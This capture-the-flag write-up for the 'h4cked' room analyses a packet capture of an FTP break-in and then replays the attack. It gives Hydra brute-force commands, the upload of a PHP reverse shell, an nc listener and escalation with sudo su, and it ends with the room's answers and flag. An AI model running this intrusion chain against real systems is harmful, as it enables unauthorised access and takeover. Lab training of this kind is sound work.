# h4cked - Easy

```shell
rustscan -a 10.10.53.85 --range 0-65535 --ulimit 5000 -- -sV

hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.53.85 ftp
#brute force attack on ftp gives password

ftp 10.10.53.85
#login and upload reverse-shell.php

put reverse-shell.php

quit

#setup listener
#and execute web shell by visiting the .php file on web server
nc -nvlp 4445

#visit reverse-shell link
#we get shell as www-data

su jenny
#use new creds

sudo -l
#we have required privileges

sudo su
#switch to root

cat /root/Reptile/flag.txt
```

```markdown
We have to analyse the given capture on Wireshark.

We can see that there are a lot of FTP password requests, this means the attacker is trying to bruteforce into FTP; a common bruteforcing tool is Hydra.

Furthermore, for FTP, the attacker is using the username 'jenny'.

At a point, we can see the Response: Login Success text; this means the password has been found, and the last password that was sent was 'password123'.

We can also navigate to Analyze > Follow > TCP Stream to view this data.

It shows that the current FTP directory is /var/www/html; this could be the directory for a web server.

The attacker has uploaded a backdoor named shell.php.

Under the FTP-DATA protocol, we can see that the attacker has used the pentestmonkey PHP reverse-shell; the text includes the URL from which it was downloaded.

Following this, there are a few commands that we can see in which the attacker interacts with the browser in order to interact with the uploaded backdoor.

After this, the attacker gets a reverse shell; we can see that 'whoami' was executed first.

We can use this sequence of packets and use Analyze > Follow > TCP Stream again to view the commands clearly.

The attacker used 'sudo -l' to check sudo privileges and it printed ALL:ALL, which means any command can be run as sudo.

Hence to get a root shell, all the attacker had to do was execute 'sudo su' to switch to root user.

We can see that the attacker has cloned a GitHub projet called Reptile from <https://github.com/f0rb1dd3n/Reptile>.

Navigating to the project link, we can see that it's a type of rootkit.

Now, taking reference from the pcap file, we need to replicate the steps to become root on the machine.

Using rustscan, we can see that ports 21 (ftp) and 80 (http) are open.

We need to attack the FTP service using Hydra; brute-forcing gives us the creds jenny:987654321

After changing the IP and port values in the reverse-shell.php file, we can upload it on the FTP server.

Post upload, we need to visit the required link to execute the webshell; ensure to setup listener prior to this.

Alternatively, we can edit the existing shell.php file as well accordingly.

After visiting the link, we get a reverse shell; now we just need to replicate the attacker's steps.

After switching to user Jenny, and using the new password we found earlier, we can use 'sudo su' to switch to root user.

Root flag can be found in /root/Reptile/flag.txt
```

1. The attacker is trying to log into a specific service. What service is this? - FTP

2. What is the name of this tool? - Hydra

3. What is the username? - jenny

4. What is the user's password? - password123

5. What is the current FTP working directory after the attacker logged in? - /var/www/html

6. What is the backdoor's filename? - shell.php

7. The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL? - http://pentestmonkey.net/tools/php-reverse-shell

8. Which command did the attacker manually execute after getting a reverse shell? - whoami

9. What is the computer's hostname? - wir3

10. Which command did the attacker execute to spawn a new TTY shell? - python3 -c 'import pty; pty.spawn("/bin/bash")'

11. Which command was executed to gain a root shell? - sudo su

12. What is the name of the GitHub project? - Reptile

13. What is this type of backdoor called? - rootkit

14. Read the flag.txt inside the Reptile directory. - ebcefd66ca4b559d17b440b6e67fd0fd
